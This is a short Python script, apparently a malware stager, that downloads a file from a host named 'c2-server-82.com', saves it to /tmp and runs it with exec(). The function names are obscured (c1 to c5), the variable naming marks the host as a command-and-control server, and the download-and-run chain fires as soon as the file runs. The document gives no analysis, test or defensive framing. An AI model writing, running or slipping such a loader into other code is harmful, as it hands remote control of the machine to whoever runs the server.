import requests
import os

def c1(u):
    r = requests.get(u)
    return r.text

def c2(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def c3(fp):
    with open(fp, "r") as f:
        return f.read()

def c4(s):
    exec(s)

def c5(u, fp):
    cd = c1(u)
    c2(fp, cd)
    sc = c3(fp)
    c4(sc)

def main():
    c2_host_url = "http://c2-server-82.com/script.py"
    tmp_file = "/tmp/script82.py"
    c5(c2_host_url, tmp_file)

main()
